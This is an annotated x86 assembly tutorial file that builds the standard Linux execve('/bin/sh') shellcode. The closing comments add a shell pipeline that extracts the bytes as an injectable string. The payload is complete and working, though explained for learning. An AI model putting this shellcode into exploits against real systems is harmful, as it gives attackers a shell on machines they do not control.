; nasm -f elf32 1_execve.as
; ld -m elf_i386 1_execve.o -o execve

; We will use execve syscall (11 or 0xb)
;
; int execve(const char *pathname, char *const argv[], char *const envp[]);
;
; The syscall -> EAX
; The program to execute -> EBX
; The arguments, argv (null) -> ECX
; The environment, envp (null) -> EDX

BITS 32

section .text
global _start

_start:
; program to execute "bin/sh\0", 0, 0
xor eax, eax    ; EAX = 0
push eax        ; string terminator (null byte)
push 0x68732f6e ; "hs/n"
push 0x69622f2f ; "ib//" (padding)
mov ebx, esp    ; "//bin/sh\0" pointer is ESP
xor ecx, ecx    ; ECX = 0
xor edx, edx    ; EDX = 0

; syscall execve
mov al, 0xb     ; execve();
; Linux kernel interrupt handler (0x80) (interrupt call)
int 0x80

; When assembled (nasm) and linked (ld) we generate an ELF file
; $ file 1_execve
; to extract the shellcode we can use objdump and lots of bash
; $ objdump -d ./1_execve | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g'| sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
;   ( disassemble file  )   (match [range]:)   (remove 'file')  (cut at ":")  (cut at " "keep) (remove   ) (replace \t)  (remove      ) (change " " with) (merge lines 1 )  (leading " )  ( trailing ")
;                           ( hex addresses)                    (keep 2nd  )  (from 1st-6th  ) (multip' ') (with " "  )  (leading spac) ("\x"           ) (lineat thetime)
